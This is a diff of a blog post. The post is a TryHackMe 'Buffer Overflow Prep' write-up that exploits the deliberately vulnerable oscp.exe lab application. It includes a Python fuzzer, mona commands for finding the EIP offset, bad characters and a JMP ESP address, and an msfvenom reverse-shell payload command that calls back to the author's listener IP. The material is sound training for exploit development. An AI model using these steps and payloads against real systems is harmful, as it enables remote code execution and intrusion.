@@ -1,11 +1,11 @@
 ---
 title: "BufferOverflow_prep.sh"
 date: 2020-09-06T02:33:31-04:00
-draft: true
+draft: false
 toc: true
 images:
   - "img/buffOverflowPrep_cover.png"
-cover: "img/buffOverflowPrep_cover.png"
+cover: "img/buffOverflowPrep_cover.gif"
 tags:
   - hacking
   - tryHackme
@@ -21,7 +21,7 @@ PS: I'm gonna be adding some audio tracks along the sections of this writeup so 
 Enjoy!
 
 - Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/bufferoverflowprep).
-- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.
+- **PLEASE NOTE:** Passwords and flag values, or in this case offsets and bad char sets were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.
 
 > {{< spoty_player >}}
 
@@ -632,7 +632,257 @@ Before we start doing anything let's turn on the volume  and play the track for 
 > Crank that volume up!
 
 
-While we enjoy Joe Dart's groove, let's start with the second OVERFLOW command!
+[Almost two days later  :stuck_out_tongue_winking_eye: ]
+
+I took some time off this to learn a bit more about buffer overlows as it started to feel like I knew less than before at some point. Anyways, we are back. I'll point to some resources I found useful when I was trying to understand this stuff:
+
+- https://www.youtube.com/watch?v=1S0aBV-Waeo
+- https://youtu.be/j7AEzGKuKUU
+- https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
+
+While we enjoy Joe Dart's groove, let's start with the second OVERFLOW command! so we can answer the following two questions:
+
+> Question #1: What is the EIP offset for OVERFLOW2?
+
+> Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?
+
+We need to basically recreate the same process we followed for the first overflow. Let's outline that process to recall all parts:
+
+1. We Fuzz the executable.
+2. We crash the app and get control of the EIP.
+3. We locate the bad characters
+4. We find and select a Jump Point
+5. We then generate our payload code
+6. We make sure to add our NOP sleds.
+7. We exploit.
+
+### Let's fuzz
+Let's grab a copy of that fuzzer script from the previous task. We need to update the following things: `IP`, `Prefix`. Note: _Instead of having the prefix hardcoded we have it in a variable so we can rehuse faster for the next set of overflow tasks._
+
+In my case it looks like this:
+
+```python
+import socket, time, sys
+
+ip = "10.10.98.134"
+port = 1337
+timeout = 5
+
+buffer = []
+counter = 0
+step = 50
+prefix = "OVERFLOW2 "
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += step
+
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        s.recv(1024)
+        print("Fuzzing with %s bytes" % len(string))
+        s.send( prefix + string + "\r\n")
+        s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
+```
+
+We RDP into the machine once deployed and do the same old. Start Immunity, open oscp.exe and unpause the execution.
+
+We run the script:
+
+
+```sh
+┌──(kali㉿kali)-[~/Documents/THM/bufferOverflowPrep]
+└─$ python overflow2_fuzz.py 
+Fuzzing with 50 bytes
+Fuzzing with 100 bytes
+Fuzzing with 150 bytes
+Fuzzing with 200 bytes
+Fuzzing with 250 bytes
+Fuzzing with 300 bytes
+Fuzzing with 350 bytes
+Fuzzing with 400 bytes
+Fuzzing with 450 bytes
+Fuzzing with 500 bytes
+Fuzzing with 550 bytes
+Fuzzing with 600 bytes
+Fuzzing with 650 bytes
+Could not connect to 10.10.98.134:1337
+```
+
+Right after 650 bytes it crashes. I'll run it one more time to see if 600 makes it crash. It did not, and instead crashed at 700. So let's say 650 is good.
+
+### We get a hold of the EIP
+
+We need to generate a payload for our exploit script, we grab a copy of that script from the last task as well. Remember to update the prefix to `OVERFLOW2`.
+
+We need our payload of 650 bytes but remember we need to add a bit of overhead let's add another 400 bytes. let's create that with the following command:
+
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1050`
+
+We use the ouput of that command to set the 'payload' variable of our exploit script. Restart the debugger and such and we run our exploit script.
+
+Once we run our script we should see the debugger stops the execution `Access Violation when executing [XXXXXXXX]`
+
+Now we need to run mona as follows: `!mona findmsp -distance 1050`:
+
+> The findmsp command will find all instances or certain references to a cyclic pattern (a.k.a. “Metasploit pattern”) in memory, registers, etc This command has an important requirement : you have to use a cyclic pattern to trigger a crash in your target application. [Link to the manual](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
+
+
+![We run findmsp command](https://i.imgur.com/aOyYQZ6.png)
+
+Remember we need to get the offset of EIP here, we are interested in the following line:
+
+`Log data, item 18
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x76413176 (offset 634)
+`
+We update the `offset` variable of our script with the value we found. Then we empty the `payload` variable and set our `retn` variable to the magic bees `BBBB`.
+
+We save the changes to our script, restart everything again and run the exploit once more. We want proof we are overwritting our EIP correctly:
+
+![We managed to hit the EIP](https://i.imgur.com/FFIrEU9.png)
+
+### We test for bad characters
+
+Now we need to look for bad characters. First we create a bytearray with Mona and by default we exclude the null byte: `!mona bytearray -b "\x00"`.
+
+Then, using our byteArray generator script we create an identical bytearray. With that generated we set the `payload` variable to the bytearray generated.
+
+We restart everything and run our expliot. This time we need to take note of the `ESP Register Address`.
+
+![ESP Register Address](https://i.imgur.com/TMpxKad.png)
+
+Now we can use mona again to find the bad chars by comparison: `!mona compare -f C:\mona\oscp\bytearray.bin -a 01A1FA30`
+
+![Bad Characters found](https://i.imgur.com/ju1vkvu.png)
+
+So we get the following bad characters not including the null byte `23 24 3c 3d 83 84 ba bb`. This is where I messed up last time, I just assumed all values returned at this point were bad characters. We need to test them to avoid the same mistake.
+
+Let's remove the first one `23` and see if the rest are still being returned by mona as Bad Chars. For the sake of any eventual reader, I'll do this without documenting every test. Just remove a badchar one by one from your payload, run and compare with mona. Be Aware that since we are modifying the payload the `ESP register` will point to a different `address` each time.
+
+`!mona compare -f C:\mona\oscp\bytearray.bin -a 0192FA30`
+
+- First Test: [ESP 0192FA30] 00 23 3c 3d 83 84 ba bb
+
+From this test we can observe that `24` was not a bad chard and was just affected by `23` being a bad char. From now on, we'll regenerate mona's bytearray and we'll remove the bad characters one by one to test they are really bad:
+
+- Initial Set: [ESP 01A1FA30] 00 23 24 3c 3d 83 84 ba bb
+- First  Test: [ESP 0192FA30] 00 23 3c 3d 83 84 ba bb
+- Second Test: [ESP 018AFA30] 00 23 3c 83 84 ba bb
+- Third  Test: [ESP 019CFA30] 00 23 3c 83 ba bb
+- Fourth Test: [ESP 0196FA30] 00 23 3c 83 ba
+
+Final Mona bytearray: `!mona bytearray -b "\x00\x23\x3c\x83\xba"`
+
+
+There you have it, we've narrow down all possible badchars until we get a list of the recurrent codes and when we compare in Mora again we get no more badchars. 
+
+![No more badchars in mona](https://i.imgur.com/jTpAg3J.png)
+It is safe to assume that these last codes `23 3c 83 ba` caused the ones that were initially returned along with them `24 3d 84 bb` to be marked as bad too. But We know now that is not always the case, we've evolved a bit. And we start to value testing more. :smile:
+
+### Finding a Jump point
+
+Now we need to find ourselves a jump point, we do that with Mona and we also use the set of badchars we have identified: `!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"`
+
+I've selected the second address in the list this time:
+
+![Available JMP addresses](https://i.imgur.com/QKZrsXe.png)
+
+`Log data, item 10
+ Address=625011BB
+ Message=  0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
+`
+We use that address in our script inside the `retn` variable. Remember our second mistake from the first overflow practice. The address needs to be formatted as little endian. `\xbb\x11\x50\x62`.
+
+### We make ourselves a payload
+
+We need a payload now, so we can reverse shell the hell out of this excercise. Using **msfvenom** we create the payload taking into account the set of bad chars:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f py`
+
+We paste the output of msfvenom to the script and set `payload = buf`. 
+
+### We add some NOP Sleds
+
+We are almost there, we just need to add some NOP sleds and we are golden (unless I already fucked it up at some point yet again).
+
+### We exploit!
+We restart everything one last time (for this task at least), we need to fire up a netcat listener as well. When we run the exploit we get our rev shell connection!
+
+![We get reverse shell](https://i.imgur.com/isGs6NQ.png)
+
+
+## Straight to the point
+
+From here we'll just use the same process to resolve the rest of the OVERFLOW commands. I won't be documenting those since it'll end up being an **INSANELY LARGE** writeup. I think that having the process outlined and practiced twice should be enough for you and me to resolve the rest of the room. I'll just be listing the results below.
+
+### TASK 3 - [oscp.exe - OVERFLOW3]
+
+- OVERFLOW3 RESULTS: 
+  - [OFFSET 1XXX]
+  - [BADCHARS 11 XX XX XX EE]
+
+### TASK 4 - [oscp.exe - OVERFLOW4]
+
+- OVERFLOW4 RESULTS: 
+  - [OFFSET 2XXX]
+  - [BADCHARS XX XD XX]
+
+### TASK 5 - [oscp.exe - OVERFLOW5]
+
+- OVERFLOW5 RESULTS: 
+  - [OFFSET 3XX]
+  - [BADCHARS XX 2F XX FX]
+
+
+### TASK 6 - [oscp.exe - OVERFLOW6]
+
+- OVERFLOW6 RESULTS: 
+  - [OFFSET XXX4]
+  - [BADCHARS 08 XX XX]
+
+### TASK 7 - [oscp.exe - OVERFLOW7]
+
+- OVERFLOW7 RESULTS: 
+  - [OFFSET 1XX6]
+  - [BADCHARS 8C XX XX XX]
+
+
+### TASK 8 - [oscp.exe - OVERFLOW8]
+
+- OVERFLOW8 RESULTS: 
+  - [OFFSET 1XX6]
+  - [BADCHARS 1D XX XX XX]
+
+### TASK 9 - [oscp.exe - OVERFLOW9]
+
+- OVERFLOW9 RESULTS: 
+  - [OFFSET 1XX4]
+  - [BADCHARS XX 3E XX EX]
+
+Note: For this one I had to do a few tries to get **all** badchars.
+
+***
+
+
+### TASK 10 - [oscp.exe - OVERFLOW10]
+
+- OVERFLOW9 RESULTS: 
+  - [OFFSET X37]
+  - [BADCHARS A0 XX BE XX XX]
+
+
+
+
+That was a **LONG** room to go through, I had to stop several times along the way just to study a bit about buffer overflows, make mistakes, debug and retrace steps. But eventually I was able to finish the room. I still feel I need to practice a lot for this process to cement. Good thing the **Offensive Pentesting** path in try hackme has a lot more of these rooms to shape those skills. Check it out [here](https://tryhackme.com/path/outline/pentesting)
+
 
 As usual, happy hacking.
 
